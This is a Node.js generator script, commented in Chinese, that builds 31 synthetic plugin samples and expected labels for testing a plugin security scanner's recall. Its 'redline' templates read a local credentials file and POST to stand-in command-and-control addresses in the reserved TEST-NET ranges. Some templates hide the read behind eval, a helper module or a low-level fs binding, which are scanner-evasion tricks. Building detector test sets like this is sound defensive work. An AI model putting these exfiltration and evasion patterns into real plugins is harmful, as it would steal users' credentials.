/**
 * Ground truth 标注集生成器（M1 出口条件：20 个已知红线插件召回 ≥90%）
 *
 * 生成 31 个合成插件样本（20 红线 + 10 良性 + 1 观测），每个样本 =
 *   samples/<id>/package.json + index.mjs (+ helper.mjs)
 *   labels.json 中的期望标注（运行时 flags/红线 + 静态 verdict/红线）
 *
 * 矩阵设计：
 *  - 行为模板：凭据窃取 × 外联/子进程/延迟/回调/帮助链/动态执行 组合
 *  - 导入方式：default / 具名 / require / namespace（对齐覆盖面矩阵）
 *  - 良性对照：本地 fs / https API / 写缓存 / 仅子进程 / localhost http
 *
 * 模板卫生（第一轮评测教训）：import 头与常量声明按需生成——
 * 否则空样本也带着 child_process import + CRED 常量，静态层全是模板污染。
 */
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SAMPLES = path.join(HERE, 'samples');

const CRED_EXPR = `path.join(os.homedir(), '.dsh', '.credentials.yaml')`;
// 外联目标用 RFC 5737 TEST-NET 保留地址（不可路由、无 DNS、零外逸）——测试基础设施不打真实域名
const C2_HTTP = 'http://203.0.113.7/p';
const C2_HTTPS = 'https://198.51.100.7/v1';
const FETCH_SIG = `, { signal: AbortSignal.timeout(500) }`;

// ---------- 行为语句（按导入方式） ----------
const STMT = {
  credRead: {
    default: () => `fs.readFileSync(CRED, 'utf8');`,
    named: () => `readFileSync(CRED, 'utf8');`,
    require: () => `fs.readFileSync(CRED, 'utf8');`,
    namespace: () => `await fs.readFile(CRED, 'utf8');`,
  },
  localRead: {
    default: () => `fs.readFileSync(path.join(import.meta.dirname, 'package.json'), 'utf8');`,
    named: () => `readFileSync(path.join(import.meta.dirname, 'package.json'), 'utf8');`,
    require: () => `fs.readFileSync(path.join(import.meta.dirname, 'package.json'), 'utf8');`,
    namespace: () => `await fs.readFile(path.join(import.meta.dirname, 'package.json'), 'utf8');`,
  },
  writeCache: {
    default: () => `fs.writeFileSync(path.join(import.meta.dirname, 'cache.tmp'), 'cache');`,
    named: () => `writeFileSync(path.join(import.meta.dirname, 'cache.tmp'), 'cache');`,
    require: () => `fs.writeFileSync(path.join(import.meta.dirname, 'cache.tmp'), 'cache');`,
    namespace: () => `await fs.writeFile(path.join(import.meta.dirname, 'cache.tmp'), 'cache');`,
  },
  exfilHttp: () => `fetch(${JSON.stringify(C2_HTTP)}, { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});`,
  exfilHttps: (get) => `fetch(${JSON.stringify(C2_HTTPS)}${get ? FETCH_SIG : `, { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }`}).catch(() => {});`,
  subprocess: {
    default: () => `cp.execSync('node -e "0"');`,
    named: () => `execSync('node -e "0"');`,
    require: () => `cp.execSync('node -e "0"');`,
    namespace: () => `cp.execSync('node -e "0"');`,
  },
  spawn: {
    default: () => `cp.spawnSync(process.execPath, ['-e', '0']);`,
    named: () => `spawnSync(process.execPath, ['-e', '0']);`,
    require: () => `cp.spawnSync(process.execPath, ['-e', '0']);`,
    namespace: () => `cp.spawnSync(process.execPath, ['-e', '0']);`,
  },
  localhostHttp: () => `fetch('http://127.0.0.1:39999/x', { signal: AbortSignal.timeout(500) }).catch(() => {});`,
};

// ---------- 样本矩阵 ----------
const MATRIX = [
  ['r01', 'redline', 'cred+exfilHttp', 'default', ['credRead', 'exfilHttp']],
  ['r02', 'redline', 'cred+exfilHttp', 'named', ['credRead', 'exfilHttp']],
  ['r03', 'redline', 'cred+exfilHttp', 'require', ['credRead', 'exfilHttp']],
  ['r04', 'redline', 'cred+exfilHttp', 'namespace', ['credRead', 'exfilHttp']],
  ['r05', 'redline', 'cred+exfilHttps', 'default', ['credRead', 'exfilHttps']],
  ['r06', 'redline', 'cred+exfilHttps', 'named', ['credRead', 'exfilHttps']],
  ['r07', 'redline', 'cred+exec', 'default', ['credRead', 'subprocess']],
  ['r08', 'redline', 'cred+exec', 'named', ['credRead', 'subprocess']],
  ['r09', 'redline', 'cred+spawn', 'require', ['credRead', 'spawn']],
  ['r10', 'redline', 'cred+spawn', 'namespace', ['credRead', 'spawn']],
  ['r11', 'redline', 'delayed(cred+exfilHttp)', 'default', ['credRead', 'exfilHttp'], 'delayed'],
  ['r12', 'redline', 'callback(cred+exfilHttp)', 'named', ['credRead', 'exfilHttp'], 'callback'],
  ['r13', 'redline', 'helperChain(cred+exfilHttps)', 'default', ['credRead', 'exfilHttps'], 'helper'],
  ['r14', 'redline', 'dynamicEval(cred)+exfilHttp', 'default', ['credRead', 'exfilHttp'], 'dynamic'],
  ['r15', 'redline', 'cred+exec+exfilHttp', 'default', ['credRead', 'subprocess', 'exfilHttp']],
  ['r16', 'redline', 'cred+exfilHttps', 'require', ['credRead', 'exfilHttps']],
  ['r17', 'redline', 'cleartextExfilOnly', 'default', ['exfilHttp']],
  ['r18', 'redline', 'dynamicEval(cred)+exfilHttp', 'require', ['credRead', 'exfilHttp'], 'dynamic'],
  ['r19', 'redline', 'cred+exfilHttps(async)', 'namespace', ['credRead', 'exfilHttps']],
  ['r20', 'redline', 'credInSpawnArgs+exfilHttp', 'default', ['credRead', 'spawn', 'exfilHttp']],
  ['b01', 'benign', 'localFsOnly', 'default', ['localRead']],
  ['b02', 'benign', 'httpsApiGet', 'named', ['exfilHttps'], 'get'],
  ['b03', 'benign', 'writeOwnCache', 'require', ['writeCache']],
  ['b04', 'benign', 'subprocessEchoOnly', 'default', ['subprocess']],
  ['b05', 'benign', 'localhostHttpFetch', 'named', ['localhostHttp']],
  ['b06', 'benign', 'readOwn+httpsApi', 'namespace', ['localRead', 'exfilHttps'], 'get'],
  ['b07', 'benign', 'subprocessVersionCheck', 'named', ['subprocess']],
  ['b08', 'benign', 'fsWrite+fsRead own', 'default', ['writeCache', 'localRead']],
  ['b09', 'benign', 'httpsApiGet delayed', 'named', ['exfilHttps'], 'get-delayed'],
  ['b10', 'benign', 'no-io', 'default', []],
  ['e01', 'observe', 'bindingDirectRead', 'default', ['credRead'], 'binding'],
];

// ---------- 按需 import 头（模板卫生） ----------
function buildHeader(styleName, needs) {
  const lines = [];
  const fsNames = [...(needs.read ? ['readFileSync'] : []), ...(needs.write ? ['writeFileSync'] : [])];
  const cpNames = [...(needs.exec ? ['execSync'] : []), ...(needs.spawn ? ['spawnSync'] : [])];
  if (styleName === 'default') {
    if (needs.fs) lines.push(`import fs from 'node:fs';`);
    if (needs.cp) lines.push(`import cp from 'node:child_process';`);
  } else if (styleName === 'named') {
    if (fsNames.length) lines.push(`import { ${fsNames.join(', ')} } from 'node:fs';`);
    if (cpNames.length) lines.push(`import { ${cpNames.join(', ')} } from 'node:child_process';`);
  } else if (styleName === 'require') {
    lines.push(`import { createRequire } from 'node:module';`, `const require = createRequire(import.meta.url);`);
    if (needs.fs) lines.push(`const fs = require('node:fs');`);
    if (needs.cp) lines.push(`const cp = require('node:child_process');`);
  } else if (styleName === 'namespace') {
    if (needs.fs) lines.push(`import * as fs from 'node:fs/promises';`);
    if (needs.cp) lines.push(`import * as cp from 'node:child_process';`);
  }
  return lines.join('\n');
}

function buildSample(id, kind, template, styleName, behaviorKeys, variant) {
  const dir = path.join(SAMPLES, id);
  mkdirSync(dir, { recursive: true });

  const isGet = variant === 'get' || variant === 'get-delayed';
  const usesCredExpr = behaviorKeys.includes('credRead') || ['helper', 'dynamic', 'binding'].includes(variant);
  const needs = {
    fs: behaviorKeys.some((k) => ['credRead', 'localRead', 'writeCache'].includes(k)) || variant === 'dynamic' || variant === 'helper',
    cp: behaviorKeys.some((k) => ['subprocess', 'spawn'].includes(k)),
    read: behaviorKeys.includes('credRead') || behaviorKeys.includes('localRead') || variant === 'dynamic',
    write: behaviorKeys.includes('writeCache'),
    exec: behaviorKeys.includes('subprocess'),
    spawn: behaviorKeys.includes('spawn'),
  };

  const stmts = behaviorKeys.map((k) => {
    const g = STMT[k];
    if (typeof g === 'function') return g(k === 'exfilHttps' ? isGet : undefined);
    return g[styleName]();
  });

  let body;
  if (variant === 'dynamic') {
    body = `const rd = eval('(p) => fs.readFileSync(p, "utf8")');\nrd(CRED);\n${STMT.exfilHttp()}`;
  } else if (variant === 'callback') {
    body = `globalThis.__gtHostCall(() => {\n  ${stmts.join('\n  ')}\n});`;
  } else if (variant === 'binding') {
    // 绕过属性层的直读：走内核 binding（考验第二层深 patch）
    // 注意：readFileUtf8 原生签名 (path, flags) 两参，少参会触发 V8 原生断言 abort
    body = `process.binding('fs').readFileUtf8(CRED, 0);`;
  } else {
    body = stmts.join('\n  ');
  }

  let helperImport = '';
  if (variant === 'helper') {
    helperImport = `import { doBad } from './helper.mjs';\n`;
    writeFileSync(path.join(dir, 'helper.mjs'),
      `import fs from 'node:fs';\nexport function doBad(credPath) {\n  fs.readFileSync(credPath, 'utf8');\n  fetch(${JSON.stringify(C2_HTTPS)}, { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});\n}\n`);
    body = `doBad(${CRED_EXPR});`;
  }

  const isDelayed = variant === 'delayed' || variant === 'get-delayed';
  const runBody = isDelayed
    ? `setTimeout(() => {\n  ${body.replace(/\n/g, '\n  ')}\n}, 10);\nawait new Promise((r) => setTimeout(r, 80));`
    : `${body}\nawait new Promise((r) => setTimeout(r, 20));`;

  const header = buildHeader(styleName, needs);
  const usesPath = usesCredExpr || behaviorKeys.includes('localRead') || behaviorKeys.includes('writeCache');
  const preamble = [
    usesPath ? `import path from 'node:path';` : '',
    usesCredExpr ? `import os from 'node:os';` : '',
    (behaviorKeys.includes('credRead') || ['dynamic', 'binding'].includes(variant)) ? `\nconst CRED = ${CRED_EXPR};` : '',
  ].filter(Boolean).join('\n');

  const code = `${header}${header && preamble ? '\n' : ''}${preamble}
${helperImport}
export async function run() {
  ${runBody.replace(/\n/g, '\n  ')}
}
export default function plugin() { return run(); }
`;
  writeFileSync(path.join(dir, 'index.mjs'), code);
  writeFileSync(path.join(dir, 'package.json'),
    JSON.stringify({ name: `gt-${id}`, version: '1.0.0', type: 'module', main: 'index.mjs' }, null, 2));

  // ---------- 期望标注 ----------
  const hasCred = behaviorKeys.includes('credRead') || variant === 'dynamic' || variant === 'binding';
  const hasHttp = behaviorKeys.includes('exfilHttp') || variant === 'dynamic';
  const hasHttps = behaviorKeys.includes('exfilHttps') && !isGet;
  const hasSub = behaviorKeys.includes('subprocess') || behaviorKeys.includes('spawn');

  const rtFlags = [];
  const rtRedLines = [];
  if (hasCred) rtFlags.push('credentials-access');
  if (hasHttp || hasHttps || isGet || behaviorKeys.includes('localhostHttp')) rtFlags.push('network');
  if (hasHttp) rtFlags.push('cleartext-http');
  if (hasSub) rtFlags.push('subprocess');
  if (hasCred && (hasHttp || hasHttps)) rtRedLines.push('credentials+network');
  if (hasCred && hasSub) rtRedLines.push('credentials+subprocess');
  if (hasHttp) rtRedLines.push('cleartext-http');

  const stRedLines = [];
  if (hasCred && (hasHttp || hasHttps)) stRedLines.push('credentials+network');
  if (hasCred && hasSub) stRedLines.push('credentials+subprocess');
  if (hasCred && variant === 'dynamic') stRedLines.push('dynamic-code+network');
  if (hasHttp) stRedLines.push('cleartext-http');
  const stVerdict = stRedLines.some((r) => r === 'cleartext-http') && hasCred ? 'BLOCK'
    : stRedLines.length ? 'WARN' : 'PASS';

  return {
    id, kind, template,
    importStyle: styleName,
    expected: {
      runtime: { flags: [...new Set(rtFlags)], redLines: rtRedLines },
      static: { verdict: stVerdict, redLines: stRedLines },
    },
  };
}

// ---------- 生成 ----------
if (existsSync(SAMPLES)) rmSync(SAMPLES, { recursive: true, force: true });
mkdirSync(SAMPLES, { recursive: true });

const labels = MATRIX.map((row) => buildSample(...row));
writeFileSync(path.join(HERE, 'labels.json'), JSON.stringify({
  generatedAt: new Date().toISOString(),
  note: '合成标注集：行为模板 × 导入方式矩阵；外联目标为 RFC 5737 TEST-NET 保留地址（零外逸）',
  samples: labels,
}, null, 2));

console.log(JSON.stringify({
  generated: labels.length,
  redline: labels.filter((l) => l.kind === 'redline').length,
  benign: labels.filter((l) => l.kind === 'benign').length,
  observe: labels.filter((l) => l.kind === 'observe').length,
  dir: SAMPLES,
}, null, 2));
